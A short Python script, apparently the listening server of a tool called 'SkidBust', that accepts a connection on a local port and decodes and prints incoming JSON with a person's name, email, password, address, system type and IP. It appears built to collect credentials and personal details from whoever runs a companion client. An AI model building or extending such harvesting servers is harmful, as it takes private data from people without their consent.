#Skittles_

import socket
import base64 as b64
import os
import json
from art import *


def cleanup(inStr):
    cleanStr = inStr
    decodeStr = b64.b64decode(cleanStr)
    return decodeStr

def jsonOut(inStr):
    outDict = json.loads(inStr)
    return [outDict["Name"], outDict["EMail"], outDict["Password"], outDict["Address"], outDict["System-type"], outDict["IP"]]

#fuck this function in the ass
def socketConn():
    #set socket options, bind it, then start listening/accepting connections.
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('127.0.0.1', 42069))
    s.listen(1)

    #On connect, print the info to screen.
    conn, addr = s.accept()
    print('\nNew Skid!\n')
    test = conn.recv(8192)
    test = test.decode('utf-8')
    print(jsonOut(cleanup(test)))

tprint('SkidBust    Server')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
    inCmmd = input('>>>')

    if inCmmd == 'listen':
        socketConn()

    elif inCmmd == 'exit':
        exit()
